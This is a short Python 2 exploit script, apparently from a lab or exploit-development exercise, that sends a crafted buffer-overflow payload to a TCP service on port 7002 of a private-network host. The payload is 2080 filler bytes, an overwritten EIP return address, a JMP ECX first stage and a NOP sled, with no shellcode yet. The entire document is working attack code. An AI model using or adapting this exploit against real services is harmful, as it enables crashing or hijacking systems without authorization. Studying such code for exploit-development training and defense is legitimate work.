#!/usr/bin/python
import socket

# Try technique of just increasing the buffer

try:
  print "\nSending evil buffer..."

  filler        = "A" * 2080
  eip           = "\x3d\x11\x80\x14" # 0x1480113d
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1
  nop_pad       = "\x90" * 10

  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
